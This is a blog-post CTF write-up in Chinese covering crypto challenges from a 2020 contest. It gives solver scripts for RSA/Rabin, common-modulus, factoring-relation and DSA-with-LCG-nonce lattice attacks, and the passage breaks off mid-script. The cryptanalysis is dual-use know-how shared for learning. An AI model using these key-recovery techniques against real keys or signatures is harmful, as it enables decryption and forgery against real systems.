<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">

<script>
    (function(){
        if(''){
            if (prompt('请输入密码') !== ''){
                alert('密码错误');
                history.back();
            }
        }
    })();
</script>









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="CTF,Crypto,Reverse,Web," />










<meta name="description" content="2020年打的第一场比赛，题目不难，时间都花去解密码题了，虽然也没解出几道（还是太菜了">
<meta property="og:type" content="article">
<meta property="og:title" content="2020 i春秋网络安全公益赛">
<meta property="og:url" content="http://yoursite.com/2020/02/23/2020icq-gys/index.html">
<meta property="og:site_name" content="feng&#39;s blog">
<meta property="og:description" content="2020年打的第一场比赛，题目不难，时间都花去解密码题了，虽然也没解出几道（还是太菜了">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-02-23T15:30:06.000Z">
<meta property="article:modified_time" content="2020-04-05T10:13:00.905Z">
<meta property="article:author" content="feng">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="Reverse">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/02/23/2020icq-gys/"/>





  <title>2020 i春秋网络安全公益赛 | feng's blog</title>
  








<meta name="generator" content="Hexo 4.2.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">feng's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/23/2020icq-gys/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="feng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/feng.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="feng's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">2020 i春秋网络安全公益赛</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-23T23:30:06+08:00">
                2020-02-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>2020年打的第一场比赛，题目不难，时间都花去解密码题了，虽然也没解出几道（还是太菜了</p>
<a id="more"></a>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm_up"></a>warm_up</h3><p>rsa+rabin+xor</p>
<p>共因子分解 p、q，再求s</p>
<p>又gcd(125794,phi)==2，只能算出 s**2 mod n</p>
<p>所以就有了 pow(s,2,p*q)  = c</p>
<p>p,q,c已知幂为2，其实就是rabin加密，可以算出4个s，其中有且仅有一个素数，由此得到s就可以算phi了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n1=p*q</span></span><br><span class="line"><span class="comment"># n2=p*r</span></span><br><span class="line"><span class="comment"># n3=p*q*s</span></span><br><span class="line"><span class="comment"># c1=pow(s,e1,n1)</span></span><br><span class="line"><span class="comment"># Key=int(KEY.encode('hex'),16)</span></span><br><span class="line"><span class="comment"># key_encode=pow(Key,e2,n3)</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">125794</span></span><br><span class="line">e2 = <span class="number">42373</span></span><br><span class="line">c1 = <span class="number">9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855</span></span><br><span class="line">n1 = <span class="number">15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121</span></span><br><span class="line">n2 = <span class="number">16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571</span></span><br><span class="line">key_encode = <span class="number">154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1, n2)</span><br><span class="line">q = n1 // p</span><br><span class="line">phi1 = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">m = getPrime(<span class="number">1500</span>)</span><br><span class="line">d1 = gmpy2.invert(e1 // <span class="number">2</span>, phi1)</span><br><span class="line">a = pow(c1, d1, n1)  <span class="comment">#s*2 = a mod n</span></span><br><span class="line"></span><br><span class="line">l = rabin_decrypt(a, p, q)</span><br><span class="line"></span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        s = i</span><br><span class="line"><span class="keyword">assert</span> (pow(s, e1, n1) == c1)</span><br><span class="line"></span><br><span class="line">n3 = p * q * s</span><br><span class="line">phi3 = phi1 * (s - <span class="number">1</span>)</span><br><span class="line">d3 = gmpy2.invert(e2, phi3)</span><br><span class="line">key = pow(key_encode, d3, n3)</span><br><span class="line"></span><br><span class="line">enc = <span class="number">17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br><span class="line">dec = key ^ enc</span><br><span class="line">mask = int(<span class="string">'1'</span> * <span class="number">335</span>, <span class="number">2</span>)</span><br><span class="line">dec = (dec ^ (dec &lt;&lt; <span class="number">200</span>)) &amp; mask</span><br><span class="line"></span><br><span class="line">print(dec)</span><br><span class="line">print(long_to_bytes(dec))</span><br></pre></td></tr></table></figure>

<p>flag{79cef3d7-2c49-4cc6-94a3-e058c6c42835}</p>
<h3 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h3><p>共模攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">s0, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = -s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = -s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = gmpy2.powmod(c1, s1, n)*gmpy2.powmod(c2, s2, n) % n</span><br><span class="line">print(<span class="string">'[-]m is:'</span>, long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;WuHanJiaYou!!!!!!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>就一个知识点 </p>
<p>q = (2**1024 - 1) ^ p + 65537 =&gt; (q-65537) + p = 2**1024 - 1</p>
<p>p+q == 2**1024-65538</p>
<p>解一元二次方程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">7772032347449135823378220332275440993540311268448333999104955932478564127911903406653058819764738253486720397879672764388694000771405819957057863950453851364451924517697547937666368408217911472655460552229194417053614032700684618244535892388408163789233729235322427060659037127722296126914934811062890693445333579231298411670177246830067908917781430587062195304269374876255855264856219488896495236456732142288991759222315207358866038667591630902141900715954462530027896528684147458995266239039054895859149945968620353933341415087063996651037681752709224486183823035542105003329794626718013206267196812545606103321821</span></span><br><span class="line">c = <span class="number">2082303370386500999739407038433364384531268495285382462393864784029350314174833975697290115374382446746560936195242108283558410023998631974392437760920681553607338859157019178565294055755787756920003102506579335103169629546410439497570201554568266074421781047420687173530441469299976286281709526307661219925667082812294328343298836241624597491473793807687939912877432920934022304415340311930199467500833755390490763679081685821950332292303679223444816832000945972744492944044912168217765156110058474974887372388032286968936052010531850687361328326741707441938740295431353926037925950161386891437897990887861853097318</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># p+q = 2**1024-65538 and p*q = n  =&gt;  q**2 - (2**1024-65538)*q + n = 0</span></span><br><span class="line">p = ((<span class="number">2</span>**<span class="number">1024</span><span class="number">-65538</span>) + gmpy2.iroot((<span class="number">2</span>**<span class="number">1024</span><span class="number">-65538</span>)**<span class="number">2</span> - <span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line">q = n//p</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;8edf268a85202e540aaa070ac8ff63d2&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h3><p>LCG to DSA，k存在线性关系</p>
<p>参考</p>
<p><a href="https://github.com/pcw109550/write-up/tree/master/2019/DEFCON/tania" target="_blank" rel="noopener">https://github.com/pcw109550/write-up/tree/master/2019/DEFCON/tania</a></p>
<p>魔改下sage代码，改得不太好，成功率大概百分之五十（虚拟机sage恢复快照恢复没了，没写成exp，拼手速</p>
<p>sage在线<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">130333458067095360348130950721230774751621761834488608409527025002236423782720410777827282553809013041996307514477632173973104508525268490069618923242342738301435251323204357581290464182936651741782879029384520572881285707893688816385746123467926351757503503539294480789448841461659407755817883221473523487973</span></span><br><span class="line">q = <span class="number">837755551167460257692787882189727780394726772833</span></span><br><span class="line">g = <span class="number">12024096372339682960526557683581436357293283215343997771131292478996528847320954685241633017653642652057102765310001443858062073122236510989249944118146042928920430149051644732814822161087549485840013542857240153830838022898248052043466838312870563425596026239434244567102769777073608663275001579392930228464</span></span><br><span class="line">y = <span class="number">108523596838679337654299921385592064511837579265203612271025521537067329951647895839430301754531744295124745776428649849251756635288111351922313014364522357798782309623603678075220735747170068419250544314336391208250408553893413488317640318013369036095801759257423651364411417495953742453694687368063103806873</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0x66656E6752C56F15150995AA5819131C3C709AACA84C5633846074689A5E06C4F482218F8C76E5A0B6F54EC9</span></span><br><span class="line">b = <span class="number">0x6C694F19FD6115B512D4B9B08891EF4D98D0131DBCB65C5082A2E50D000F9709873B9DB7743A4F3466C7</span></span><br><span class="line"></span><br><span class="line">z1 = a&gt;&gt;<span class="number">320</span></span><br><span class="line">r1 = (a&gt;&gt;<span class="number">160</span>)&amp;(<span class="number">2</span>**<span class="number">160</span><span class="number">-1</span>)</span><br><span class="line">s1 = a&amp;(<span class="number">2</span>**<span class="number">160</span><span class="number">-1</span>)</span><br><span class="line">z2 = b&gt;&gt;<span class="number">320</span></span><br><span class="line">r2 = (b&gt;&gt;<span class="number">160</span>)&amp;(<span class="number">2</span>**<span class="number">160</span><span class="number">-1</span>)</span><br><span class="line">s2 = b&amp;(<span class="number">2</span>**<span class="number">160</span><span class="number">-1</span>)</span><br><span class="line">a = (<span class="number">233333</span>*y)%q</span><br><span class="line">b = (<span class="number">0x2333</span>*y)%q</span><br><span class="line">c = [a,b,q,a,b,q,<span class="number">2</span>,<span class="number">-1</span>,q,q]</span><br><span class="line"><span class="comment"># k2 = (c[6] * ((c[0] * k1 + c[1]) % c[2]) + c[7] * ((c[3] * k1 + c[4]) % c[5]) + c[8]) % c[9]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Babai_closest_vector</span><span class="params">(M, G, target)</span>:</span></span><br><span class="line">    <span class="comment"># Babai's Nearest Plane algorithm</span></span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).round()</span><br><span class="line">            small -= M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://cseweb.ucsd.edu/~mihir/papers/dss-lcg.pdf</span></span><br><span class="line">B = Matrix([</span><br><span class="line">    [-r1, -r2,     <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>, <span class="number">2</span> / q,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>], <span class="comment"># x</span></span><br><span class="line">    [ s1,   <span class="number">0</span>,     <span class="number">0</span>, -c[<span class="number">0</span>], -c[<span class="number">3</span>],     <span class="number">0</span>, <span class="number">2</span> / c[<span class="number">9</span>],        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>], <span class="comment"># k1</span></span><br><span class="line">    [  <span class="number">0</span>,  s2,     <span class="number">1</span>,     <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>,        <span class="number">0</span>, <span class="number">2</span> / c[<span class="number">9</span>],        <span class="number">0</span>,        <span class="number">0</span>], <span class="comment"># k2</span></span><br><span class="line">    [  <span class="number">0</span>,   <span class="number">0</span>, -c[<span class="number">6</span>],     <span class="number">1</span>,     <span class="number">0</span>,     <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>, <span class="number">2</span> / c[<span class="number">2</span>],        <span class="number">0</span>], <span class="comment"># v1</span></span><br><span class="line">    [  <span class="number">0</span>,   <span class="number">0</span>, -c[<span class="number">7</span>],     <span class="number">0</span>,     <span class="number">1</span>,     <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>, <span class="number">2</span> / c[<span class="number">5</span>]], <span class="comment"># v2</span></span><br><span class="line">    [  q,   <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>],</span><br><span class="line">    [  <span class="number">0</span>,   q,     <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>],</span><br><span class="line">    [  <span class="number">0</span>,   <span class="number">0</span>,  c[<span class="number">9</span>],     <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>],</span><br><span class="line">    [  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  c[<span class="number">2</span>],     <span class="number">0</span>,     <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>],</span><br><span class="line">    [  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,     <span class="number">0</span>,  c[<span class="number">5</span>],     <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>,        <span class="number">0</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">Y = vector([z1, z2, c[<span class="number">8</span>], c[<span class="number">1</span>], c[<span class="number">4</span>], <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># k2 = (c[6] * ((c[0] * k1 + c[1]) % c[2]) + c[7] * ((c[3] * k1 + c[4]) % c[5]) + c[8]) % c[9]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v1 = (c[0] * k1 + c[1]) % c[2]</span></span><br><span class="line"><span class="comment"># v2 = (c[3] * k1 + c[4]) % c[5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -r1 x + k1 s1 = z1 mod q</span></span><br><span class="line"><span class="comment"># -r2 x + k2 s2 = z2 mod q</span></span><br><span class="line"><span class="comment"># k2 - c[6] v1 - c[7] v2 = c[8] mod c[9]</span></span><br><span class="line"><span class="comment"># -c[0] * k1 + v1 = c[1] mod c[2]</span></span><br><span class="line"><span class="comment"># -c[3] * k1 + v2 = c[4] mod c[5]</span></span><br><span class="line"><span class="comment"># 1/x  ~ 2 / q</span></span><br><span class="line"><span class="comment"># 1/k1 ~ 2 / m3</span></span><br><span class="line"><span class="comment"># 1/k2 ~ 2 / m3</span></span><br><span class="line"><span class="comment"># 1/v1 ~ 2 / c[2]</span></span><br><span class="line"><span class="comment"># 1/v2 ~ 2 / c[5]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> itr <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="comment"># print("Trial: &#123;:d&#125;".format(itr))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        ia = randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">        ib = randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">        <span class="keyword">if</span> ib == ia:</span><br><span class="line">            ib = (ib + <span class="number">1</span>) % <span class="number">10</span></span><br><span class="line">        val = randint(<span class="number">-10</span>, <span class="number">10</span>)</span><br><span class="line">        B[ia] += val * B[ib]</span><br><span class="line"></span><br><span class="line">    M = B.LLL()</span><br><span class="line">    G = M.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    W = Babai_closest_vector(M, G, Y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (W[<span class="number">0</span>] == Y[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">and</span> W[<span class="number">1</span>] == Y[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">and</span> W[<span class="number">2</span>] == Y[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">and</span> W[<span class="number">3</span>] == Y[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">and</span> W[<span class="number">4</span>] == Y[<span 